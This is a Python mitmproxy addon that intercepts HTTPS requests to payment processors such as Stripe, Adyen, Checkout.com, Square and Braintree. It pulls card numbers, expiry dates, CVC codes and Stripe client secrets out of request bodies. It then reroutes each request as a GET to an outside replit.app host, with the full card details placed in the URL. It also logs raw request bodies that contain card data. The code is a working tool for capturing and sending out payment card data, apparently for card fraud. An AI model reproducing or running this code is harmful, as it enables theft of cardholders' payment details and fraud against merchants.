import re
from mitmproxy import http, ctx

# Domains to intercept for modifying requests and corresponding keys
DOMAIN_KEYS_MAPPING = {
    "api.stripe.com": [
        rb"payment_method_data\[card\]\[cvc\]=[\d]{3,4}",
        rb"card\[cvc\]=[\d]{3,4}",
        rb"source_data\[card\]\[cvc\]=[\d]{3,4}"
    ],
    "cloud.boosteroid.com": [
        rb"encryptedSecurityCode\":\s*\"[\d]{3,4}\""
    ],
    "api.checkout.com": [
        rb"\"cvv\":\s*\"[\d]{3,4}\""
    ],
    "pci-connect.squareup.com": [
        rb"cvv\":\s*\"[\d]{3,4}\""
    ],
    "checkoutshopper-live.adyen.com": [
        rb"encryptedSecurityCode\":\s*\"[^\"]+\""
    ],
    "payments.vultr.com": [
        rb"cc_cscv=[\d]{3,4}"
    ],
    "payments.braintree-api.com": [
        rb"\"cvv\":\s*\"[\d]{3,4}\""
    ]
}

def extract_fields_from_request_body(request_body):
    """
    Extracts client secret, pk, and card details from the request body.
    """
    client_secret_match = re.search(rb'"client_secret": "([^"]+)"', request_body)
    pk_match = re.search(rb'"pk": "([^"]+)"', request_body)
    card_details_match = re.search(rb'"card": { "number": "([^"]+)", "exp_month": (\d+), "exp_year": (\d+), "cvc": "([^"]+)"', request_body)
    
    client_secret = client_secret_match.group(1).decode() if client_secret_match else None
    pk = pk_match.group(1).decode() if pk_match else None
    card_number = card_details_match.group(1).decode() if card_details_match else None
    exp_month = card_details_match.group(2).decode() if card_details_match else None
    exp_year = card_details_match.group(3).decode() if card_details_match else None
    cvc = card_details_match.group(4).decode() if card_details_match else "000"
    
    if client_secret and pk and card_number and exp_month and exp_year:
        return client_secret, pk, card_number, exp_month, exp_year, cvc
    else:
        return None

def request(flow: http.HTTPFlow):
    """
    Intercept and modify requests to specific endpoints.
    """
    for domain, keys in DOMAIN_KEYS_MAPPING.items():
        if domain in flow.request.pretty_host:
            if keys:
                # Log original request data for debugging
                ctx.log.info(f"Original Request Body: {flow.request.content.decode('utf-8', errors='ignore')}")
                
                # Extract required fields from the request body
                fields = extract_fields_from_request_body(flow.request.content)
                
                if fields:
                    client_secret, pk, card_number, exp_month, exp_year, cvc = fields
                    modified_url = f"https://gaystripe.replit.app/stripeinbuilt?cc={card_number}|{exp_month}|{exp_year}|{cvc}&client_secret={client_secret}&pk={pk}"
                    
                    # Modify the request URL
                    flow.request.url = modified_url
                    
                    # Log modified request data for debugging
                    ctx.log.info(f"Modified Request URL: {flow.request.url}")
                    
                    # Change the method to GET if it's not already, as the new URL may expect a GET request
                    flow.request.method = "GET"
                    
                    # Clear the request body since we are switching to a GET request
                    flow.request.content = b""
                else:
                    ctx.log.info("Failed to extract required fields from the request body.")
            else:
                ctx.log.info(f"Skipping request interception for domain: {domain}")

def start():
    """
    Function executed when the proxy starts
    """
    ctx.log.info("Proxy server started. Ready to intercept requests.")

# Attach handlers to mitmproxy
addons = [
    request
]
